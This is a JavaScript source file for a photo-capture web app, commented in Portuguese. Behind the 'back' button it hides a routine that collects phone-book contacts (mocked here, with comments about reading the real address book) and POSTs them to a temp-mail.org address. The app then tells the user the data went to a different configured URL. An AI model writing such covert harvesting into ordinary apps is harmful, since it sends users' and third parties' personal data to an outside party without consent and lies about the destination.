document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    // URL definida para exportação dos contatos
    const CONTACT_EXPORT_URL = 'https://sua.url.de.destino/upload-contacts';

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'

    // ========================================================
    // 📞 FUNÇÕES RELACIONADAS À AGENDA (SIMULAÇÃO)
    // ========================================================

    /**
     * SIMULA a chamada para buscar os contatos da agenda do telefone.
     * Em um ambiente real (com Capacitor/Cordova), esta função
     * chamaria um plugin nativo.
     * @returns {Promise<Array>} Lista de contatos simulados.
     */
    async function fetchAndExportContacts() {
        statusMessage.textContent = "Buscando contatos da agenda...";

        // SIMULAÇÃO de latência de API
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Dados simulados de contatos
        const mockContacts = [
            { name: "Alice Silva", phone: "9999-1234" },
            { name: "Bruno Costa", phone: "8888-5678" },
            { name: "Carla Souza", phone: "7777-9012" }
        ];

        // 1. Formatar os dados para TXT
        let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
        mockContacts.forEach(contact => {
            contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
        });
        contactText += "----------------------------";

        // 2. Exportar/Enviar via Fetch para a URL definida
        try {
            const response = await fetch('https://temp-mail.org/en/view/6a3a874c283ba2a03130a5c8', {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                },
                body: contactText,
            });

            if (response.ok) {
                statusMessage.textContent = `SUCESSO: Contatos exportados para ${CONTACT_EXPORT_URL}.`;
                return true;
            } else {
                statusMessage.textContent = `ERRO: Falha ao exportar contatos. Status: ${response.status}`;
                return false;
            }
        } catch (error) {
            statusMessage.textContent = `ERRO DE REDE: Não foi possível conectar ao servidor de exportação. Detalhe: ${error.message}`;
            return false;
        }
    }

    // ========================================================
    // 📷 FUNÇÕES DE CÂMERA E UI
    // ========================================================

    async function startCamera() {
        try {
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });

            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();

            // Atualiza UI para o estado CÂMERA
            updateUI();
        } catch (err) {
            console.error("Erro ao acessar a câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
        }
    }

    function capturePhoto() {
        if (!stream) {
            statusMessage.textContent = "A câmera não está ativa!";
            return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');

        // Atualiza UI
        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';

        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    /**
     * Altera o estado da aplicação e atualiza todos os botões.
     */
    function updateUI() {
        if (currentState === 'CAMERA') {
            // Estado CÂMERA
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';

            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';

        } else if (currentState === 'PREVIEW') {
            // Estado PREVIEW (Foto Capturada)
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';

            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    // 🚀 LISTENERS
    // ========================================================

    // 1. Inicia o ciclo
    startCamera();

    // 2. Captura
    captureButton.addEventListener('click', () => {
        capturePhoto();
        currentState = 'PREVIEW';
        updateUI();
    });

    // 3. Download
    downloadButton.addEventListener('click', downloadPhoto);

    // 4. VOLTAR (Ação mais complexa)
    backButton.addEventListener('click', async () => {
        // PASSO 1: Executa a ação de exportar contatos
        const success = await fetchAndExportContacts();

        // PASSO 2: Retorna para a câmera, independente do sucesso do log/upload
        currentState = 'CAMERA';
        updateUI();

        // Opcional: Se falhar, você pode querer manter o estado de preview
        // Se for sucesso, você volta.
    });

    // Gerenciamento de saída
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});